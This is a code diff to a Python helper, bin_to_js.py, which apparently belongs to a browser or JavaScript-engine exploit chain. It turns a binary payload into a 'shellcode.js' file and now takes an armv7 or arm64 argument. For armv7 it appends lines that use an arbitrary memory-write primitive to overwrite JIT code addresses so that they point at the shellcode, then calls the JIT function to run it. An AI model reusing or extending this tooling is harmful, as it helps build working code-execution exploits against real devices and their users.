@@ -18,18 +18,27 @@ def process_bin_file(file_path):
         
 
 def main():
-    if len(sys.argv) != 2:
-        print("python bin_to_js.py <bin>")
+    if len(sys.argv) != 3:
+        print("python bin_to_js.py <bin> <armv7/arm64>")
         return
 
     file_path = sys.argv[1]    
+    arch = sys.argv[2]    
+
     if os.path.exists("shellcode.js"):
         os.remove("shellcode.js")    
     process_bin_file(file_path)
 
     with open("shellcode.js", 'a') as target:
-        target.write("jitted_func();")
-
+        if arch == "arm64":
+            target.write("jitted_func();\n")
+        elif arch == "armv7":
+            target.write("mem.write32(jit_addr2, jit_addr2+0x4);\n")
+            target.write("mem.write32(jit_addr2+0x4, jit_addr2+0x4);\n")
+            target.write("mem.write32(jit_addr2+0x08, shellcode+0x1);\n")
+            target.write("mem.write32(jit_addr2+0x30, jit_addr2+0x30+4-0x18);\n")
+            target.write("mem.write32(jit_addr2+0x34, jit_addr2+0x8-0x1c);\n")
+            target.write("jit_func2();\n")
 
 if __name__ == "__main__":
     main()
